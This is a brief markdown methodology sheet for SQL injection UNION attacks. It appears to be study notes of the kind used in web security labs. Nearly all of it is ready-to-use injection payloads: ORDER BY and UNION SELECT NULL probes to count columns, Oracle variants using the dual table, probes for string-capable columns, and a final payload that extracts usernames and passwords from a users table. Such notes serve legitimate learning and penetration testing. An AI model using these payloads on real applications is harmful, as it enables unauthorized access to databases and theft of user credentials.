# Methodology for SQL injection UNION attacks
#UNION 

## 1. Determine the number of columns of the result set 

Test using the following methods:

### ORDER BY testing
Look for errors, generally when the column index is exceeded.

```SQL
' ORDER BY 1--
' ORDER BY 2--
' ORDER BY 3--
' ORDER BY 4--
```

### UNION SELECT testing

Look for affirmative responses depending on the number of `NULL` present on the query.
```SQL
' UNION SELECT NULL-- 
' UNION SELECT NULL,NULL-- 
' UNION SELECT NULL,NULL,NULL--
```

### For Oracle database use the following payload
It's necessary to always select from a table, use the built-in `dual` table.

```SQL
' UNION SELECT NULL FROM dual--
' UNION SELECT NULL,NULL FROM dual--
' UNION SELECT NULL,NULL,NULL FROM dual--
```

## 2. Determine which columns of the result set can hold string data

Use the following payload  checking the application's response to get information form errors about the data type or if it prompts no errors it indicates the column can hold string data.

(depending on the number of columns. In this example 4)
```SQL
' UNION SELECT 'a',NULL,NULL,NULL-- 
' UNION SELECT NULL,'a',NULL,NULL-- 
' UNION SELECT NULL,NULL,'a',NULL-- 
' UNION SELECT NULL,NULL,NULL,'a'--
```

### For Oracle database use the following payload

```SQL
' UNION SELECT 'a',NULL FROM dual--
' UNION SELECT NULL,'a' FROM dual--
```

## 3. Extract data

Depending on the application's logic and the enumeration of the database once the vulnerability is found, retrieve sensitive data from the database tables, for example:

```SQL
' UNION SELECT NULL,username || '~' || password FROM users--
```
